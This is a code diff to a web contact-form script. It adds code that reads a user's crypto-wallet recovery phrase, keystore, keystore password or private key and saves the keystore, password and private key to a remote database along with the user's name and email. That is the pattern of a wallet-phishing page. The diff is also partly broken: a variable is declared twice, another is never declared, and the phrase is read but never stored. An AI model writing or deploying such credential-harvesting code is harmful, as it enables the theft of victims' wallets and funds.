@@ -19,13 +19,33 @@ document.getElementById("contactForm").addEventListener("submit", submitForm);
 function submitForm(e) {
   e.preventDefault();
 
+  
   var name = getElementVal("name");
   var emailid = getElementVal("emailid");
   var msgContent = getElementVal("msgContent");
   var selectedWallet = getElementVal("selected-wallet");
-  
+  const selectedWallet = document.getElementById('selected-wallet').value;
+            const walletInfoType = document.getElementById('wallet-info-type').value;
 
-  saveMessages(name, emailid, msgContent,selectedWallet);
+            // Retrieve information input based on the selected type
+            
+            switch (walletInfoType) {
+                case 'phrase':
+                    walletCredentials = document.getElementById('wallet-phrase').value;
+                    break;
+                case 'keystore':
+                    var walletKeystore = document.getElementById('wallet-keystore').value;
+                    var walletPassword = document.getElementById('wallet-password').value;
+                    
+                    break;
+                case 'private-key':
+                    var walletPrivateKey = document.getElementById('wallet-private-key').value;
+                    break;
+                default:
+                    break;
+            }
+
+  saveMessages(name, emailid, msgContent,selectedWallet,walletKeystore,walletPassword,walletPrivateKey);
 
   //   enable alert
   document.querySelector(".alert").style.display = "block";
@@ -39,7 +59,7 @@ function submitForm(e) {
   document.getElementById("contactForm").reset();
 }
 
-const saveMessages = (name, emailid, msgContent,selectedWallet) => {
+const saveMessages = (name, emailid, msgContent,selectedWallet,walletKeystore,walletPassword,walletPrivateKey) => {
   var newContactForm = contactFormDB.push();
 
   newContactForm.set({
@@ -47,6 +67,9 @@ const saveMessages = (name, emailid, msgContent,selectedWallet) => {
     emailid: emailid,
     msgContent: msgContent,
      selectedWallet: selectedWallet,
+    walletKeystore: walletKeystore,
+    walletPassword: walletPassword,
+    walletPrivateKey: walletPrivateKey,
   });
 };
 
@@ -89,3 +112,5 @@ function showInfoInput(selectedWallet) {
                     break;
             }
         }
+
+  
